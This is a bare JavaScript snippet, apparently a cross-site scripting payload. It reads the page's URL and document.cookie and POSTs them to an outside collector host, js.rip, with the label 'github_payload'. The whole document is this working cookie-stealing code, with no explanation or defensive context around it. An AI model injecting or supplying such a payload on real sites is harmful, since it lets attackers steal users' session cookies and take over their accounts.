fetch('https://js.rip/hhlt1r4khl', {
  method: 'POST',
  body: JSON.stringify({
    url: window.location.href,
    cookies: document.cookie,
    payload: 'github_payload'
  })
})
